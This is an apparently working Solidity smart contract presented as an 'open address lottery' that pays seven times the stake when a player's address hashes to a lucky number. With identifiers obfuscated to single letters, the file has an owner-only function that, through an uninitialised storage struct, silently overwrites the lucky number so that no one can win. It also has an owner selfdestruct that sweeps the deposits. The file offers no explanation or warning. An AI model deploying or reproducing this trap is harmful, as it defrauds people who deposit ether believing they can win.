pragma solidity ^0.4.19;

contract OpenAddressLottery{
    struct SeedComponents{
        uint j;
        uint e;
        uint g;
        uint i;
    }

    address n;
    uint private d;
    uint private f;
    uint LuckyNumber = 7;

    mapping (address => bool) l;

    function OpenAddressLottery() {
        n = msg.sender;
        m(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function b() payable {
        if(msg.value<0.1 ether)
            return;


        require(l[msg.sender] == false);

        if(a(msg.sender) == LuckyNumber){
            l[msg.sender] = true;

            uint q=msg.value*7;

            if(q>this.balance)
                q=this.balance;
            msg.sender.transfer(q);
        }

        if(block.number-f>1000)
            m(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function a(address p) constant returns(uint n){

        n = uint(k(uint(p), d)[0]) % 8;
    }

    function m(SeedComponents h) internal {
        d = uint256(k(
            h.j,
            h.e,
            h.g,
            h.i
        ));
        f = block.number;
    }

    function o() {
        require(msg.sender==n);

        selfdestruct(msg.sender);
    }

    function c() {
        require(msg.sender==n);
        SeedComponents s;
        s.j = uint(msg.sender);
        s.e = uint256(block.blockhash(block.number - 1));
        s.g = block.difficulty*(uint)(block.coinbase);
        s.i = tx.gasprice * 7;

        m(s);
    }

    function () payable {
        if(msg.value>=0.1 ether && msg.sender!=n)
            b();
    }

}